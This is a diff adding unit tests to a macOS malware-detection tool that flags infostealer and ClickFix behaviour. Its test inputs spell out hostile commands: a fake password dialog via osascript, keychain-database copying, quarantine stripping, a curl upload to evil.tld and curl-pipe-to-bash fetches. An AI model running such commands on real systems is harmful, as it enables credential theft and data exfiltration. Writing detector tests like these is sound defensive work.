@@ -16,6 +16,7 @@ import plistlib
 import subprocess
 import sys
 import tempfile
+import time
 import unittest
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -57,6 +58,17 @@ class Sandbox(unittest.TestCase):
             "EXTRA_PERSIST_DIRS": [],
             "BROWSER_EXT_ROOTS": [],
             "IDE_EXT_ROOTS": [],
+            # Behavioral-tier surfaces likewise read the live host (shell history,
+            # /tmp staging, wallet apps, canaries, XProtect). Pin them empty/sandboxed
+            # so cmd_scan-level tests are deterministic; dedicated tests point a
+            # single global at fixture data to exercise it.
+            "SHELL_HISTORY_FILES": [],
+            "STAGING_DIRS": [],
+            "WALLET_CONFIG_FILES": [],
+            "WALLET_APP_BINS": [],
+            "XPROTECT_BUNDLES": [],
+            "CANARY_DIRS": [],
+            "CANARY_STATE": os.path.join(self.state, "canaries.json"),
             "_sigcache": {},
         }
         for k, v in overrides.items():
@@ -66,6 +78,13 @@ class Sandbox(unittest.TestCase):
         self.notifications = []
         self._saved["notify"] = aegis.notify
         aegis.notify = lambda title, msg: self.notifications.append((title, msg))
+        # check_behavior() reads the live process table and check_xprotect() shells
+        # out to `log show`; both are non-deterministic on a dev host. Stub them to
+        # empty for cmd_scan-level tests — dedicated tests call the pure helpers
+        # (_argv_signals) and check_xprotect parsing directly.
+        for fn in ("check_behavior", "check_xprotect"):
+            self._saved[fn] = getattr(aegis, fn)
+            setattr(aegis, fn, (lambda *a, **k: []))
 
     def tearDown(self):
         for k, v in self._saved.items():
@@ -699,6 +718,332 @@ class TestInterpreterScriptTarget(Sandbox):
     def test_interpreter_against_trusted_script_stays_low(self):
         # /etc is not in RISKY_PREFIXES and not hidden → stays LOW.
         self.assertEqual(self._sev(["/bin/bash", "/etc/somewhere"]), "LOW")
+
+
+# --------------------------------------------------------------------------- #
+# N14 — BEHAVIORAL argv tier: the fileless-stealer signals. High-precision
+# structural signals notify (HIGH/CRITICAL); a lone benign-installer idiom stays
+# MEDIUM (below notify) so a Homebrew/rustup `curl | bash` in flight is not a HIGH.
+# --------------------------------------------------------------------------- #
+class TestArgvSignals(Sandbox):
+    def _sev(self, argv):
+        sigs = aegis._argv_signals(argv)
+        if not sigs:
+            return None
+        return max(sigs, key=lambda s: aegis.SEV_ORDER[s[1]])[1]
+
+    def test_osascript_password_phish_is_critical(self):
+        self.assertEqual(self._sev(
+            'osascript -e display dialog "System update needs your password" '
+            'default answer "" with hidden answer'), "CRITICAL")
+
+    def test_dscl_authonly_is_high(self):
+        self.assertEqual(self._sev('dscl . -authonly user hunter2'), "HIGH")
+
+    def test_quarantine_strip_is_high(self):
+        self.assertEqual(self._sev('xattr -dr com.apple.quarantine /tmp/update'), "HIGH")
+        self.assertEqual(self._sev('xattr -c /tmp/update'), "HIGH")
+
+    def test_hdiutil_nobrowse_is_high(self):
+        self.assertEqual(self._sev('hdiutil attach -nobrowse /tmp/x.dmg'), "HIGH")
+
+    def test_tccutil_reset_is_high(self):
+        self.assertEqual(self._sev('tccutil reset All'), "HIGH")
+
+    def test_keychain_db_access_is_high(self):
+        self.assertEqual(self._sev(
+            'cp /Users/x/Library/Keychains/login.keychain-db /tmp/kc'), "HIGH")
+
+    def test_curl_exfil_post_is_high(self):
+        self.assertEqual(self._sev(
+            'curl -k -X POST -F file=@/tmp/app.zip https://evil.tld/up'), "HIGH")
+
+    def test_fileless_fetch_exec_combo_is_high(self):
+        # network fetch piped into an interpreter = the fileless pipeline.
+        self.assertEqual(self._sev('curl -fsSL https://evil.tld/x | bash'), "HIGH")
+        self.assertEqual(self._sev('curl -s https://evil.tld/s | osascript'), "HIGH")
+
+    def test_lone_curl_pipe_is_not_notify_grade(self):
+        # A bare pipe-to-shell with NO network fetch (benign-ish) stays < HIGH.
+        sev = self._sev('cat script.sh | bash')
+        self.assertIsNotNone(sev)
+        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)
+
+    def test_antivm_probe_is_medium(self):
+        self.assertEqual(self._sev('sysctl hw.optional.arm.FEAT_BTI'), "MEDIUM")
+
+    def test_benign_argv_is_clean(self):
+        self.assertIsNone(self._sev('/usr/bin/python3 /Users/x/app.py --serve'))
+        self.assertIsNone(self._sev('git commit -m "curl the docs later"'))
+
+    def test_perl_regex_alternation_not_a_pipe(self):
+        # A `|` INSIDE a quoted perl/sed regex alternation is not a shell pipe —
+        # `s{(rm|node|perl)}` must NOT trip pipe-to-interpreter (live-host FP fix).
+        sigs = aegis._argv_signals("perl -i -pe 's{(rm|mv|node|perl|python)}{X}g' f")
+        self.assertNotIn("pipe-to-interpreter", [n for n, _ in sigs], sigs)
+
+
+# --------------------------------------------------------------------------- #
+# N15 — check_behavior: same-user filtering + never flags Aegis itself.
+# --------------------------------------------------------------------------- #
+class TestCheckBehavior(Sandbox):
+    def _run_with_ps(self, ps_rows):
+        # Sandbox stubs check_behavior to []; restore the real one and feed it a
+        # canned process table via a stubbed aegis.run.
+        real_check = self._saved["check_behavior"]
+        saved_run = aegis.run
+
+        def fake_run(cmd, timeout=15):
+            if cmd[:2] == ["ps", "-axo"]:
+                return "\n".join(ps_rows), "", 0
+            return saved_run(cmd, timeout)
+        aegis.run = fake_run
+        try:
+            return real_check()
+        finally:
+            aegis.run = saved_run
+
+    def test_same_user_hostile_process_flagged(self):
+        uid = str(os.getuid())
+        rows = ["  501 %s /usr/bin/osascript osascript -e display dialog "
+                "\"pw\" default answer \"\" with hidden answer" % uid]
+        fs = self._run_with_ps(rows)
+        self.assertTrue(any(f["category"] == "behavior" for f in fs), fs)
+        self.assertEqual(fs[0]["severity"], "CRITICAL")
+
+    def test_other_user_process_ignored(self):
+        # uid 0 (root) row: unprivileged Aegis can't trust its argv → skipped.
+        rows = ["    1 0 /usr/bin/osascript osascript -e display dialog "
+                "\"pw\" default answer \"\" with hidden answer"]
+        self.assertEqual(self._run_with_ps(rows), [])
+
+    def test_aegis_itself_not_flagged(self):
+        uid = str(os.getuid())
+        rows = ["  777 %s /usr/bin/python3 python3 aegis.py scan" % uid]
+        self.assertEqual(self._run_with_ps(rows), [])
+
+
+# --------------------------------------------------------------------------- #
+# N16 — shell HISTORY: ClickFix terminal-paste residue.
+# --------------------------------------------------------------------------- #
+class TestShellHistory(Sandbox):
+    def _hist(self, *lines):
+        p = os.path.join(self.tmp, ".zsh_history")
+        with open(p, "w") as f:
+            f.write("\n".join(lines) + "\n")
+        aegis.SHELL_HISTORY_FILES = [p]
+        return aegis.check_shell_history()
+
+    def test_clickfix_chain_flagged_high(self):
+        fs = self._hist("ls -la",
+                        "dscl . -authonly $(whoami) $PW && curl -o /tmp/update https://evil.tld/x")
+        self.assertTrue(fs)
+        self.assertEqual(fs[0]["severity"], "HIGH")
+        self.assertEqual(fs[0]["category"], "shell-history")
+
+    def test_zsh_extended_history_prefix_stripped(self):
+        fs = self._hist(": 1700000000:0;curl -fsSL https://evil.tld/x | bash")
+        self.assertTrue(fs)
+
+    def test_clean_history_no_findings(self):
+        self.assertEqual(self._hist("cd ~/src", "git status", "make test"), [])
+
+    def test_first_run_adopts_history_silently_then_new_alerts(self):
+        # Shell-history residue (a months-old `curl|sh` install line) is adopted
+        # silently on the FIRST scan — logged, not notified — so upgrading Aegis on
+        # a busy machine is not a storm; a NEW hostile line thereafter alerts.
+        f1 = aegis.finding("HIGH", "shell-history",
+                           "Hostile command in shell history", "old install",
+                           "shellhist:.zsh_history:aaaa1111")
+        self.assertEqual(aegis.emit([f1], first_run=True), [],
+                         "existing history must be silent on first run")
+        f2 = aegis.finding("HIGH", "shell-history",
+                           "Hostile command in shell history", "new phish",
+                           "shellhist:.zsh_history:bbbb2222")
+        self.assertEqual(len(aegis.emit([f2], first_run=False)), 1,
+                         "a new hostile line must alert after first run")
+
+    def test_first_run_does_not_suppress_live_behavior(self):
+        # Contrast: a RUNNING hostile process (behavior) is a live threat and must
+        # alert even on the very first scan — suppression is residue-only.
+        fb = aegis.finding("CRITICAL", "behavior", "Suspicious process behavior",
+                           "osascript phish", "behavior:osascript:cccc3333")
+        self.assertEqual(len(aegis.emit([fb], first_run=True)), 1)
+
+
+# --------------------------------------------------------------------------- #
+# N17 — /tmp loot-staging IOC filenames.
+# --------------------------------------------------------------------------- #
+class TestStaging(Sandbox):
+    def _stage(self, name, age_days=0):
+        d = os.path.join(self.tmp, "stg")
+        os.makedirs(d, exist_ok=True)
+        p = os.path.join(d, name)
+        with open(p, "w") as f:
+            f.write("loot")
+        if age_days:
+            old = time.time() - age_days * 86400
+            os.utime(p, (old, old))
+        aegis.STAGING_DIRS = [d]
+        return aegis.check_staging()
+
+    def test_ioc_archive_flagged(self):
+        fs = self._stage("app.zip")
+        self.assertTrue(fs)
+        self.assertEqual(fs[0]["severity"], "HIGH")
+        self.assertEqual(fs[0]["category"], "staging")
+
+    def test_staged_keychain_flagged(self):
+        self.assertTrue(self._stage("login.keychain-db"))
+
+    def test_non_ioc_ignored(self):
+        self.assertEqual(self._stage("myproject.zip"), [])
+
+    def test_old_ioc_ignored(self):
+        self.assertEqual(self._stage("app.zip", age_days=30), [])
+
+
+# --------------------------------------------------------------------------- #
+# N18 — XProtect Remediator harvest: a detection event → CRITICAL; clean → none.
+# --------------------------------------------------------------------------- #
+class TestXProtectHarvest(Sandbox):
+    def _harvest(self, ndjson_lines):
+        aegis.XPROTECT_BUNDLES = []  # skip freshness; test detection parsing only
+        real = self._saved["check_xprotect"]
+
+        def fake_run(cmd, timeout=45):
+            if cmd[:2] == ["log", "show"]:
+                return "\n".join(ndjson_lines), "", 0
+            return "", "", 0
+        saved_run = aegis.run
+        aegis.run = fake_run
+        try:
+            return real()
+        finally:
+            aegis.run = saved_run
+
+    def _event(self, module, status, caused=None):
+        msg = json.dumps({"status_message": status, "caused_by": caused or []})
+        return json.dumps({
+            "processImagePath":
+                "/Library/Apple/System/Library/CoreServices/XProtect.app/"
+                "Contents/MacOS/XProtectRemediator%s" % module,
+            "eventMessage": msg, "timestamp": "2026-07-13 18:42:58"})
+
+    def test_detection_is_critical(self):
+        fs = self._harvest([self._event("KeySteal", "ThreatRemediated",
+                                        ["/tmp/evil"])])
+        self.assertTrue(fs)
+        self.assertEqual(fs[0]["severity"], "CRITICAL")
+        self.assertEqual(fs[0]["category"], "xprotect")
+
+    def test_clean_scan_no_finding(self):
+        self.assertEqual(
+            self._harvest([self._event("RankStank", "NoThreatDetected")]), [])
+
+
+# --------------------------------------------------------------------------- #
+# N19 — wallet integrity surface: a config/binary change alerts HIGH.
+# --------------------------------------------------------------------------- #
+class TestWalletIntegrity(Sandbox):
+    def test_wallet_config_change_is_high(self):
+        p = os.path.join(self.tmp, "app.json")
+        with open(p, "w") as f:
+            f.write('{"endpoints":"legit"}')
+        aegis.WALLET_CONFIG_FILES = [p]
+        aegis.WALLET_APP_BINS = []
+        prior = aegis.snapshot_wallet()
+        with open(p, "w") as f:
+            f.write('{"endpoints":"attacker"}')
+        fs = aegis.diff_wallet(prior, aegis.snapshot_wallet())
+        self.assertTrue(fs)
+        self.assertEqual(fs[0]["severity"], "HIGH")
+        self.assertEqual(fs[0]["category"], "wallet-integrity")
+
+
+# --------------------------------------------------------------------------- #
+# N20 — known-vendor label impersonation (ClickFix Keystone): a com.google.*
+# label whose program isn't Google-signed is HIGH/CRITICAL; a genuine one isn't.
+# --------------------------------------------------------------------------- #
+class TestVendorImpersonation(Sandbox):
+    def _sev(self, label, authority, prog="/Users/x/.hidden/GoogleUpdate"):
+        rec = {"label": label, "program": prog, "args": [prog],
+               "trust": "developer-id", "sha256": "s", "run_at_load": True,
+               "env": None, "authority": authority}
+        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
+
+    def test_fake_keystone_is_high_or_critical(self):
+        sev = self._sev("com.google.keystone.agent",
+                        "Developer ID Application: Totally Not Google (ABCDE12345)")
+        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)
+
+    def test_genuine_google_not_impersonation(self):
+        # Correct Google Team ID in the authority → not flagged as impersonation.
+        # (A trusted-path, dev-id-signed Google agent should not score HIGH here.)
+        sev = self._sev("com.google.keystone.agent",
+                        "Developer ID Application: Google LLC (EQHXZ8M8AV)",
+                        prog="/Library/Google/GoogleSoftwareUpdate/agent")
+        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)
+
+    def test_real_keystone_unresolvable_program_not_high(self):
+        # Live-host FP fix: the REAL Google Keystone plist often points at a path
+        # absent at scan time (trust 'unknown', no authority) — an unresolvable
+        # program is a weak 'missing' signal, NOT impersonation, so it must not be
+        # HIGH (would false-positive on legitimate Google software every scan).
+        rec = {"label": "com.google.keystone.agent", "program": None,
+               "args": None, "trust": "unknown", "sha256": None,
+               "run_at_load": True, "env": None, "authority": None}
+        sev = aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
+        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)
+
+
+# --------------------------------------------------------------------------- #
+# N21 — canary / honeypot tripwire: modified or deleted canary → CRITICAL.
+# --------------------------------------------------------------------------- #
+class TestCanaries(Sandbox):
+    def _plant(self, content="canary"):
+        p = os.path.join(self.tmp, "canary.txt")
+        with open(p, "w") as f:
+            f.write(content)
+        aegis.save_json(aegis.CANARY_STATE, {p: aegis.sha256(p)})
+        return p
+
+    def test_intact_canary_no_finding(self):
+        self._plant()
+        self.assertEqual(aegis.check_canaries(), [])
+
+    def test_modified_canary_is_critical(self):
+        p = self._plant()
+        with open(p, "w") as f:
+            f.write("ENCRYPTED_BY_RANSOMWARE")
+        fs = aegis.check_canaries()
+        self.assertTrue(fs)
+        self.assertEqual(fs[0]["severity"], "CRITICAL")
+
+    def test_deleted_canary_is_critical(self):
+        p = self._plant()
+        os.remove(p)
+        fs = aegis.check_canaries()
+        self.assertTrue(fs and fs[0]["severity"] == "CRITICAL")
+
+
+# --------------------------------------------------------------------------- #
+# N22 — trust-store tamper: baseline.json edited out-of-band → self-protection HIGH.
+# --------------------------------------------------------------------------- #
+class TestTrustStoreTamper(Sandbox):
+    def test_out_of_band_baseline_edit_flagged(self):
+        aegis.save_json(aegis.BASELINE, {"persistence": {}})
+        aegis.record_selfstate()  # records the baseline hash as known-good
+        # Attacker edits the baseline directly (poisons ground truth).
+        aegis.save_json(aegis.BASELINE, {"persistence": {"/evil.plist": {}}})
+        fs = aegis.check_self_protection()
+        self.assertTrue(any("tampered" in f["fingerprint"] for f in fs), fs)
+
+    def test_no_false_positive_when_unchanged(self):
+        aegis.save_json(aegis.BASELINE, {"persistence": {}})
+        aegis.record_selfstate()
+        fs = aegis.check_self_protection()
+        self.assertFalse(any("tampered" in f["fingerprint"] for f in fs), fs)
 
 
 if __name__ == "__main__":
